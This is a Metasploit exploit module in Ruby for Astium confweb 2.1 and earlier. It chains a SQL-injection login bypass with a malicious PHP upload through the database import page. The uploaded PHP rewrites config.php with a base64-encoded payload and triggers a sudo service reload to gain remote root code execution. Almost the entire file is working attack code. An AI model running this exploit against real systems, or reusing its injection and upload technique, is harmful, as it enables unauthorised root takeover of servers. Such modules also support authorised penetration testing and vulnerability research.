##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ManualRanking # Configuration is overwritten and service reloaded

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Astium Remote Code Execution",
      'Description'    => %q{
        This module exploits vulnerabilities found in Astium astium-confweb-2.1-25399 RPM and
        lower. A SQL Injection vulnerability is used to achieve authentication bypass and gain
        admin access. From an admin session arbitrary PHP code upload is possible. It is used
        to add the final PHP payload to "/usr/local/astium/web/php/config.php" and execute the
        "sudo /sbin/service astcfgd reload" command to reload the configuration and achieve
        remote root code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module
        ],
      'References'     =>
        [
          [ 'OSVDB', '88860' ],
          [ 'EDB', '23831' ]
        ],
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['Astium 2.1', {}]
        ],
      'Privileged'     => true,
      'DisclosureDate' => "Sep 17 2013",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to the Astium installation', '/']),
        ], self.class)
  end

  def peer
    return "#{rhost}:#{rport}"
  end

  def uri
    return target_uri.path
  end

  def check
    # Check version
    print_status("#{peer} - Trying to detect Astium")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "en", "content", "index.php")
    })

    if res and res.code == 302 and res.body =~ /direct entry from outside/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def exploit
    print_status("#{peer} - Access login page")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri),
      'vars_get' => {
        'js' => '0',
        'ctest' => '1',
        'origlink' => '/en/content/index.php'
      }
    })

    if res and res.code == 302 and res.get_cookies =~ /astiumnls=([a-zA-Z0-9]+)/
      session = $1
      print_good("#{peer} - Session cookie is [ #{session} ]")
      redirect =  URI(res.headers['Location'])
      print_status("#{peer} - Location is [ #{redirect} ]")
    else
      fail_with(Exploit::Failure::Unknown, "#{peer} - Access to login page failed!")
    end


    # Follow redirection process
    print_status("#{peer} - Following redirection")
    res = send_request_cgi({
      'uri' => "#{redirect}",
      'method' => 'GET',
      'cookie' => "astiumnls=#{session}"
    })

    if not res or res.code != 200
      fail_with(Exploit::Failure::Unknown, "#{peer} - Redirect failed!")
    end


    sqlirandom = rand_text_numeric(8)

    # SQLi to bypass authentication
    sqli="system' OR '#{sqlirandom}'='#{sqlirandom}"

    # Random password
    pass = rand_text_alphanumeric(10)

    post_data = "__act=submit&user_name=#{sqli}&pass_word=#{pass}&submit=Login"
    print_status("#{peer} - Using SQLi to bypass authentication")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "/en", "logon.php"),
      'cookie' => "astiumnls=#{session}",
      'data'   => post_data
    })

    if not res or res.code != 302
      fail_with(Exploit::Failure::Unknown, "#{peer} - Login bypass was not succesful!")
    end

    # Random filename
    payload_name = rand_text_alpha(rand(10) + 5) + '.php'

    phppayload = "<?php "
    # Make backup of the "/usr/local/astium/web/php/config.php" file
    phppayload << "$orig = file_get_contents('/usr/local/astium/web/php/config.php');"
    # Add the payload to the end of "/usr/local/astium/web/php/config.php". Also do a check if we are root,
    # else during the config reload it might happen that an extra shell is spawned as the apache user.
    phppayload << "$replacement = base64_decode(\"#{Rex::Text.encode_base64(payload.encoded)}\");"   
    phppayload << "$f = fopen('/usr/local/astium/web/php/config.php', 'w');"
    phppayload << "fwrite($f, $orig . \"<?php if (posix_getuid() == 0) {\" . $replacement . \"} ?>\");"
    phppayload << "fclose($f);"
    # Reload astcfgd using sudo (so it will read our payload with root privileges).
    phppayload << "system('sudo /sbin/service astcfgd reload');"
    # Sleep 1 minute, so that we have enough time for the reload to trigger our payload
    phppayload << "sleep(60);"
    # Restore our original config.php, else the Astium web interface won't work anymore.
    phppayload << "$f = fopen('/usr/local/astium/web/php/config.php', 'w');"
    phppayload << "fwrite($f, $orig);"
    phppayload << "fclose($f);"
    phppayload << "?>"

    post_data = Rex::MIME::Message.new
    post_data.add_part("submit", nil, nil, "form-data; name=\"__act\"")
    post_data.add_part(phppayload, "application/octet-stream", nil, "file; name=\"importcompany\"; filename=\"#{payload_name}\"")
    file = post_data.to_s.gsub(/^\r\n\-\-\_Part\_/, '--_Part_')

    print_status("#{peer} - Uploading Payload [ #{payload_name} ]")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, "en", "database", "import.php"),
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'cookie' => "astiumnls=#{session}",
      'data'   => file
    })

    # If the server returns 200 and the body contains our payload name,
    # we assume we uploaded the malicious file successfully
    if not res or res.code != 200 or res.body !~ /#{payload_name}/
      fail_with(Exploit::Failure::Unknown, "#{peer} - File wasn't uploaded, aborting!")
    end

    register_file_for_cleanup("/usr/local/astium/web/html/upload/#{payload_name}")

    print_status("#{peer} - Requesting Payload [ #{uri}upload/#{payload_name} ]")
    print_status("#{peer} - Waiting as the reloading process may take some time, this may take a couple of minutes")
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, "upload", "#{payload_name}")
    }, 120)

    # If we don't get a 200 when we request our malicious payload, we suspect
    # we don't have a shell, either. 
    if res and res.code != 200
      print_error("#{peer} - Unexpected response...")
    end

  end

end


